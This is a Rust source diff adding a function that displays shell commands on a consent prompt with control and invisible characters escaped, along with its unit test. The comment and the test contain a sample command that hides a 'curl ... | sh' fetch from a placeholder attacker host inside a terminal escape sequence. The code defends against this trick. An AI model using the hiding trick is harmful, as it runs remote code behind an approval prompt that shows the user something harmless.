@@ -262,6 +262,33 @@ pub(crate) fn strip_ansi(s: &str) -> String {
     out
 }
 
+/// Render a shell command a consent surface asks the user to approve (HOOK-91,
+/// HOOK-199), so what is shown is what runs.
+///
+/// [`strip_ansi`] cannot be used here: it deletes a whole escape sequence, OSC
+/// payload included, while `sh -c` still executes the bytes inside it, so
+/// `echo ok \x1b]; curl ... | sh #\x07` would display as `echo ok`. Instead
+/// every control character (ESC, CR, BEL, ...) and every blocked invisible code
+/// point is written as a visible `\u{..}` escape, and nothing is dropped. A tab
+/// stays a tab. Each newline is written as `newline`, so a caller can keep a
+/// multi-line script readable (a newline plus the field's indent) or keep a
+/// one-line message unambiguous (`\n`).
+// spec: HOOK-91 HOOK-199
+pub(crate) fn show_command(s: &str, newline: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        match c {
+            '\n' => out.push_str(newline),
+            '\t' => out.push('\t'),
+            c if is_control(c) || is_blocked_unicode(c) => {
+                out.push_str(&format!("\\u{{{:x}}}", u32::from(c)));
+            }
+            c => out.push(c),
+        }
+    }
+    out
+}
+
 /// Sanitize a filesystem path for display (DSC-95): a path built from a
 /// source-controlled item name (a store path, a lobe link target) can embed
 /// ANSI/control/bidi bytes just as much as the name itself.
@@ -291,6 +318,31 @@ pub(crate) fn has_blocked_chars(s: &str) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // spec: HOOK-199
+    #[test]
+    fn show_command_escapes_and_drops_nothing() {
+        assert_eq!(show_command("make install", "\\n"), "make install");
+        // Stripping deletes an OSC payload `sh -c` would still run.
+        let hidden = "echo ok \x1b]; curl https://evil.example/x | sh #\x07";
+        assert!(
+            !strip_ansi(hidden).contains("curl"),
+            "{:?}",
+            strip_ansi(hidden)
+        );
+        assert!(show_command(hidden, "\\n").contains("; curl https://evil.example/x | sh #"));
+        assert_eq!(
+            show_command("a\x1b]x\x07\rb\u{202e}c\u{e0041}", "\\n"),
+            "a\\u{1b}]x\\u{7}\\u{d}b\\u{202e}c\\u{e0041}"
+        );
+        assert_eq!(show_command("a\tb\nc", "\\n"), "a\tb\\nc");
+        assert_eq!(show_command("a\nb", "\n  "), "a\n  b");
+        // Printable non-ASCII is kept.
+        assert_eq!(show_command("echo caf\u{e9}", "\\n"), "echo caf\u{e9}");
+        // Whatever is left contains nothing strip_ansi would remove.
+        let s = show_command("x\x1b[2K\x00\u{200b}y\nz", " ");
+        assert!(!has_blocked_chars(&s), "{s:?}");
+    }
 
     // spec: TUI-60
     #[test]
